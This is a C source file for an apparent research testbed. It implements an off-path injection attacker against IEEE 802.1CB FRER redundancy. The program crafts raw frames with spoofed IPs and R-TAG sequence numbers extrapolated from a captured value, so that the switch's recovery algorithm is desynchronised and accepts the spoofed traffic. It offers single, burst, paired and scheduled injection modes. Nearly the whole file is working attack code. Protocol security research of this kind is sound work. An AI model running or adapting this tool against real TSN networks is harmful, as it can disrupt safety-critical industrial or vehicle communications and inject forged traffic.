/* tsn_inject.c — off-path FRER injection attacker (physical testbed).
 *
 * Crafts and sends EXACTLY ONE raw IEEE 802.1CB frame out a plain NIC
 * (attacker host on S3 Gi1/2). The frame carries a chosen R-TAG sequence
 * number so it can desynchronise the Vector Recovery Algorithm on S4.
 *
 * On-wire layout (untagged; ring ports are access VLAN 100):
 *   [dst MAC 6][src MAC 6][0xF1C1][reserved 0x0000][seq16]
 *   [0x0800][IPv4 hdr][UDP hdr][payload: magic "FRER" + app_seq sentinel + pad]
 *
 * The switch does NOT generate this R-TAG (that is exactly the point): S3
 * forwards by dst-MAC toward S4 Gi1/3, where the recovery instance reads the
 * injected sequence number. If accepted (terminating recovery strips the
 * R-TAG) the inner UDP frame is delivered to the listener, where tcpdump on
 * udp/9999 sees the sentinel app_seq — proof the SRF accepted the frame.
 *
 * Build: gcc -O2 -o tsn_inject tsn_inject.c
 * Run:   sudo ./tsn_inject <iface> <rtag_seq> [app_seq_hex]
 *        e.g. sudo ./tsn_inject enp4s0 12345 0xDEADBEEF
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define RTAG_ETHERTYPE 0xF1C1
#define INNER_ETHERTYPE 0x0800   /* IPv4 */
#define MAGIC 0x46524552u        /* "FRER" */

/* fixed testbed parameters */
static const uint8_t DST_MAC[6] = {0x70,0xf8,0xe7,0xd0,0x13,0x8b}; /* listener */
static const char *SRC_IP = "10.0.1.99";    /* attacker (spoofed, off-path) */
static const char *DST_IP = "10.0.1.150";   /* listener */
static const uint16_t UDP_DPORT = 9999;
static const int PAD = 24;                    /* payload bytes after magic+app_seq */

static uint16_t ipcsum(const void *data, int len){
    const uint16_t *p = data; uint32_t s = 0;
    while(len > 1){ s += *p++; len -= 2; }
    if(len) s += *(const uint8_t*)p;
    while(s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

int main(int argc, char **argv){
    /* Calibrated send-time mode: seq is computed at the instant of sendto() from the
     * calibration (rtag_cap @ t_cap) + elapsed frames + offset, so the sudo/shell
     * pipeline latency does NOT shift the effective offset. */
    if(argc < 5){ fprintf(stderr,
        "usage: %s <iface> <rtag_cap> <t_cap_ns> <offset> [app_seq_hex]\n"
        "       %s <iface> <rtag_cap> <t_cap_ns> <offset> burst <app_base_hex> <n> <period_ns>\n"
        "       %s <iface> <rtag_cap> <t_cap_ns> <o1> pair <o2> <app_base_hex> <n_pairs> <dt_ns> <pair_period_ns>\n"
        "       %s <iface> <rtag_cap> <t_cap_ns> 0 sched <off_csv> <app_base_hex> <n_cycles> <dt_ns> <cycle_period_ns>\n"
        "   env TSN_FPS (default 1000) sets the legit frame rate used for R-TAG extrapolation.\n",
        argv[0],argv[0],argv[0],argv[0]); return 1; }
    const char *iface = argv[1];
    uint32_t rtag_cap = (uint32_t)strtoul(argv[2],NULL,0);
    unsigned long long t_cap_ns = strtoull(argv[3],NULL,0);
    long offset = strtol(argv[4],NULL,0);
    /* g_fps: legit frame rate (frames/s). The R-TAG advances 1 per legit frame, so over
     * delta_ms wall-clock ms it advances round(delta_ms * fps/1000). Default 1000 keeps
     * every prior run byte-identical; set TSN_FPS=200 for the moderate profile. */
    long g_fps = getenv("TSN_FPS") ? atol(getenv("TSN_FPS")) : 1000;
    if(g_fps <= 0) g_fps = 1000;
    /* Burst mode = the ONLY difference vs single-shot: an internal, paced send loop.
     * Every iteration still crafts + sends exactly ONE valid 802.1CB frame, and still
     * computes its R-TAG seq immediately before sendto() (same latency-correct logic).
     * No other attacker property changes (off-path, non-observing, valid frames).
     * Pair mode = same, two single frames (o1,o2) dt_ns apart. Sched mode = same, a
     * general per-cycle list of offsets (stack/ramp), each a single valid frame with its
     * own send-time seq + unique app_seq. No new capability, only the injection pattern. */
    int burst = (argc >= 9  && strcmp(argv[5],"burst")==0);
    int pair  = (argc >= 11 && strcmp(argv[5],"pair")==0);
    int do_sched = (argc >= 11 && strcmp(argv[5],"sched")==0);
    uint32_t app_base = 0; long nburst = 0; unsigned long long period_ns = 0;
    long offset2 = 0, npairs = 0; unsigned long long dt_ns = 0, pair_period_ns = 0;
    long soff[128]; int nsoff = 0; long ncycles = 0; unsigned long long cyc_period_ns = 0;
    uint32_t app_seq;
    if(burst){
        app_base = (uint32_t)strtoul(argv[6],NULL,0);
        nburst   = strtol(argv[7],NULL,0);
        period_ns= strtoull(argv[8],NULL,0);
        app_seq  = app_base;
    } else if(pair){
        offset2        = strtol(argv[6],NULL,0);
        app_base       = (uint32_t)strtoul(argv[7],NULL,0);
        npairs         = strtol(argv[8],NULL,0);
        dt_ns          = strtoull(argv[9],NULL,0);
        pair_period_ns = strtoull(argv[10],NULL,0);
        app_seq        = app_base;
    } else if(do_sched){
        char *csv = strdup(argv[6]);
        for(char *tok=strtok(csv,","); tok && nsoff<128; tok=strtok(NULL,","))
            soff[nsoff++] = strtol(tok,NULL,0);
        app_base      = (uint32_t)strtoul(argv[7],NULL,0);
        ncycles       = strtol(argv[8],NULL,0);
        dt_ns         = strtoull(argv[9],NULL,0);
        cyc_period_ns = strtoull(argv[10],NULL,0);
        app_seq       = app_base;
    } else {
        app_seq = (argc>5) ? (uint32_t)strtoul(argv[5],NULL,0) : 0xDEADBEEFu;
    }
    uint16_t seq = 0;   /* patched at send time */

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(fd < 0){ perror("socket(AF_PACKET) — need root"); return 1; }

    struct ifreq ifr; memset(&ifr,0,sizeof ifr);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if(ioctl(fd, SIOCGIFINDEX, &ifr) < 0){ perror("SIOCGIFINDEX"); return 1; }
    int ifindex = ifr.ifr_ifindex;
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){ perror("SIOCGIFHWADDR"); return 1; }
    uint8_t src_mac[6]; memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6);

    uint8_t buf[512]; int o = 0;
    /* Ethernet */
    memcpy(buf+o, DST_MAC, 6); o += 6;
    memcpy(buf+o, src_mac, 6); o += 6;
    buf[o++] = (RTAG_ETHERTYPE>>8)&0xff; buf[o++] = RTAG_ETHERTYPE&0xff;
    /* R-TAG: reserved(2)=0, seq(2) */
    buf[o++] = 0x00; buf[o++] = 0x00;
    buf[o++] = (seq>>8)&0xff; buf[o++] = seq&0xff;
    /* inner ethertype */
    buf[o++] = (INNER_ETHERTYPE>>8)&0xff; buf[o++] = INNER_ETHERTYPE&0xff;

    int payload_len = 4 + 4 + PAD;             /* magic + app_seq + pad */
    int udp_len = 8 + payload_len;
    int ip_len = 20 + udp_len;

    /* IPv4 header */
    int ip_off = o;
    uint8_t *ip = buf + ip_off;
    memset(ip, 0, 20);
    ip[0] = 0x45; ip[1] = 0x00;
    ip[2] = (ip_len>>8)&0xff; ip[3] = ip_len&0xff;
    ip[4]=0x00; ip[5]=0x01; ip[6]=0x00; ip[7]=0x00;   /* id=1, no frag */
    ip[8] = 64; ip[9] = 17;                            /* ttl, proto=UDP */
    inet_pton(AF_INET, SRC_IP, ip+12);
    inet_pton(AF_INET, DST_IP, ip+16);
    uint16_t c = ipcsum(ip,20); ip[10]=c&0xff; ip[11]=(c>>8)&0xff; /* csum in network order via byte layout */
    o += 20;

    /* UDP header (checksum 0 = disabled for IPv4) */
    uint8_t *udp = buf + o;
    udp[0]=0x00; udp[1]=0x00;                          /* sport 0 */
    udp[2]=(UDP_DPORT>>8)&0xff; udp[3]=UDP_DPORT&0xff; /* dport 9999 */
    udp[4]=(udp_len>>8)&0xff; udp[5]=udp_len&0xff;
    udp[6]=0x00; udp[7]=0x00;                          /* csum disabled */
    o += 8;

    /* payload */
    *(uint32_t*)(buf+o) = htonl(MAGIC); o += 4;
    int appseq_off = o;                        /* patch point for per-injection app_seq */
    *(uint32_t*)(buf+o) = htonl(app_seq); o += 4;
    memset(buf+o, 0xA5, PAD); o += PAD;

    struct sockaddr_ll sa; memset(&sa,0,sizeof sa);
    sa.sll_family = AF_PACKET; sa.sll_ifindex = ifindex;
    sa.sll_halen = 6; memcpy(sa.sll_addr, DST_MAC, 6);

    /* Pair mode: paired-window-probe. Each cycle emits I1@offset then, dt_ns later,
     * I2@offset2 — both single valid frames, each with its own send-time seq and a
     * unique app_seq (I1=app_base+2k even, I2=app_base+2k+1 odd). Cycles are spaced
     * pair_period_ns apart so every pair starts from a re-anchored recovery state. */
    if(pair){
        struct timespec sched; clock_gettime(CLOCK_MONOTONIC,&sched);
        unsigned long long base_ns=(unsigned long long)sched.tv_sec*1000000000ull+sched.tv_nsec;
        printf("[pair] START npairs=%ld o1=%ld o2=%ld dt_ns=%llu period_ns=%llu app_base=0x%08x\n",
               npairs, offset, offset2, dt_ns, pair_period_ns, app_base);
        for(long k=0;k<npairs;k++){
            unsigned long long p0 = base_ns + (unsigned long long)k*pair_period_ns;
            /* --- I1 @ offset --- */
            struct timespec w1={.tv_sec=p0/1000000000ull,.tv_nsec=p0%1000000000ull};
            clock_nanosleep(CLOCK_MONOTONIC,TIMER_ABSTIME,&w1,NULL);
            uint32_t a1=app_base+(uint32_t)(2*k);
            *(uint32_t*)(buf+appseq_off)=htonl(a1);
            struct timespec c1; clock_gettime(CLOCK_REALTIME,&c1);
            unsigned long long t1=(unsigned long long)c1.tv_sec*1000000000ull+c1.tv_nsec;
            long d1=(long)((t1-t_cap_ns)/1000000ull); long r1=((long)rtag_cap+(d1*g_fps)/1000)%65536;
            uint16_t s1=(uint16_t)(((r1+offset)%65536+65536)%65536);
            buf[16]=(s1>>8)&0xff; buf[17]=s1&0xff;
            if(sendto(fd,buf,o,0,(struct sockaddr*)&sa,sizeof sa)<0){perror("sendto I1");return 1;}
            printf("PAIR %ld I1 SENT t_send_ns=%llu delta_ms=%ld rtag_ref=%ld offset=%ld rtag_inject=%u app_seq=0x%08x\n",
                   k,t1,d1,r1,offset,s1,a1);
            /* --- I2 @ offset2, dt_ns after I1's scheduled tick --- */
            unsigned long long p1=p0+dt_ns;
            struct timespec w2={.tv_sec=p1/1000000000ull,.tv_nsec=p1%1000000000ull};
            clock_nanosleep(CLOCK_MONOTONIC,TIMER_ABSTIME,&w2,NULL);
            uint32_t a2=app_base+(uint32_t)(2*k+1);
            *(uint32_t*)(buf+appseq_off)=htonl(a2);
            struct timespec c2; clock_gettime(CLOCK_REALTIME,&c2);
            unsigned long long t2=(unsigned long long)c2.tv_sec*1000000000ull+c2.tv_nsec;
            long d2=(long)((t2-t_cap_ns)/1000000ull); long r2=((long)rtag_cap+(d2*g_fps)/1000)%65536;
            uint16_t s2=(uint16_t)(((r2+offset2)%65536+65536)%65536);
            buf[16]=(s2>>8)&0xff; buf[17]=s2&0xff;
            if(sendto(fd,buf,o,0,(struct sockaddr*)&sa,sizeof sa)<0){perror("sendto I2");return 1;}
            printf("PAIR %ld I2 SENT t_send_ns=%llu delta_ms=%ld rtag_ref=%ld offset=%ld rtag_inject=%u app_seq=0x%08x\n",
                   k,t2,d2,r2,offset2,s2,a2);
        }
        printf("[pair] END pairs=%ld\n", npairs);
        return 0;
    }

    /* Sched mode: general stack/ramp. Each cycle emits nsoff single frames at offsets
     * soff[0..nsoff-1], dt_ns apart; cycles spaced cyc_period_ns. app_seq = app_base +
     * cycle*nsoff + j (unique). Each frame: one valid 802.1CB frame, seq computed right
     * before its own sendto(). Subsumes pair; used for Block 2 (stack/ramp). */
    if(do_sched){
        struct timespec sc; clock_gettime(CLOCK_MONOTONIC,&sc);
        unsigned long long base_ns=(unsigned long long)sc.tv_sec*1000000000ull+sc.tv_nsec;
        printf("[sched] START ncycles=%ld nsoff=%d dt_ns=%llu period_ns=%llu app_base=0x%08x fps=%ld\n",
               ncycles, nsoff, dt_ns, cyc_period_ns, app_base, g_fps);
        for(long c=0;c<ncycles;c++){
            unsigned long long cstart = base_ns + (unsigned long long)c*cyc_period_ns;
            for(int j=0;j<nsoff;j++){
                unsigned long long tk = cstart + (unsigned long long)j*dt_ns;
                struct timespec w={.tv_sec=tk/1000000000ull,.tv_nsec=tk%1000000000ull};
                clock_nanosleep(CLOCK_MONOTONIC,TIMER_ABSTIME,&w,NULL);
                uint32_t aj=app_base+(uint32_t)(c*nsoff+j);
                *(uint32_t*)(buf+appseq_off)=htonl(aj);
                struct timespec cc; clock_gettime(CLOCK_REALTIME,&cc);
                unsigned long long tj=(unsigned long long)cc.tv_sec*1000000000ull+cc.tv_nsec;
                long dj=(long)((tj-t_cap_ns)/1000000ull); long rj=((long)rtag_cap+(dj*g_fps)/1000)%65536;
                uint16_t sj=(uint16_t)(((rj+soff[j])%65536+65536)%65536);
                buf[16]=(sj>>8)&0xff; buf[17]=sj&0xff;
                if(sendto(fd,buf,o,0,(struct sockaddr*)&sa,sizeof sa)<0){perror("sendto sched");return 1;}
                printf("SCHED %ld %d SENT t_send_ns=%llu delta_ms=%ld rtag_ref=%ld offset=%ld rtag_inject=%u app_seq=0x%08x\n",
                       c,j,tj,dj,rj,soff[j],sj,aj);
            }
        }
        printf("[sched] END cycles=%ld\n", ncycles);
        return 0;
    }

    /* Compute the R-TAG sequence at the LAST possible instant before sending, from the
     * calibration, so the effective forward offset relative to the live RecovSeqNum is not
     * shifted by sudo/exec latency. R advances ~1 per ms at 1000 fps. */
    if(!burst){
        struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
        unsigned long long t_send_ns = (unsigned long long)ts.tv_sec*1000000000ull + ts.tv_nsec;
        long delta_ms = (long)((t_send_ns - t_cap_ns)/1000000ull);
        long rtag_ref = ((long)rtag_cap + (delta_ms*g_fps)/1000) % 65536;
        seq = (uint16_t)(((rtag_ref + offset) % 65536 + 65536) % 65536);
        buf[16] = (seq>>8)&0xff; buf[17] = seq&0xff;   /* patch R-TAG seq in the frame */

        ssize_t n = sendto(fd, buf, o, 0, (struct sockaddr*)&sa, sizeof sa);
        if(n < 0){ perror("sendto"); return 1; }
        printf("[inject] SENT %zd bytes t_send_ns=%llu delta_ms=%ld rtag_ref=%ld offset=%ld rtag_inject=%u app_seq=0x%08x\n",
               n, t_send_ns, delta_ms, rtag_ref, offset, seq, app_seq);
        return 0;
    }

    /* Burst mode: paced internal loop. Absolute schedule (CLOCK_MONOTONIC) sets the
     * inter-frame period; the R-TAG seq is still computed from CLOCK_REALTIME right
     * before each sendto(). Unique app_seq = app_base + i identifies each frame. */
    struct timespec sched; clock_gettime(CLOCK_MONOTONIC, &sched);
    unsigned long long base_ns = (unsigned long long)sched.tv_sec*1000000000ull + sched.tv_nsec;
    printf("[burst] START n=%ld period_ns=%llu offset=%ld app_base=0x%08x\n",
           nburst, period_ns, offset, app_base);
    for(long i=0;i<nburst;i++){
        unsigned long long tick = base_ns + (unsigned long long)i*period_ns;
        struct timespec tw = { .tv_sec = tick/1000000000ull, .tv_nsec = tick%1000000000ull };
        clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &tw, NULL);

        uint32_t cur_app = app_base + (uint32_t)i;
        *(uint32_t*)(buf+appseq_off) = htonl(cur_app);   /* unique per-injection sentinel */

        struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
        unsigned long long t_send_ns = (unsigned long long)ts.tv_sec*1000000000ull + ts.tv_nsec;
        long delta_ms = (long)((t_send_ns - t_cap_ns)/1000000ull);
        long rtag_ref = ((long)rtag_cap + (delta_ms*g_fps)/1000) % 65536;
        seq = (uint16_t)(((rtag_ref + offset) % 65536 + 65536) % 65536);
        buf[16] = (seq>>8)&0xff; buf[17] = seq&0xff;

        ssize_t n = sendto(fd, buf, o, 0, (struct sockaddr*)&sa, sizeof sa);
        if(n < 0){ perror("sendto"); return 1; }
        printf("IDX %ld [inject] SENT %zd bytes t_send_ns=%llu delta_ms=%ld rtag_ref=%ld offset=%ld rtag_inject=%u app_seq=0x%08x\n",
               i, n, t_send_ns, delta_ms, rtag_ref, offset, seq, cur_app);
    }
    printf("[burst] END sent=%ld\n", nburst);
    return 0;
}
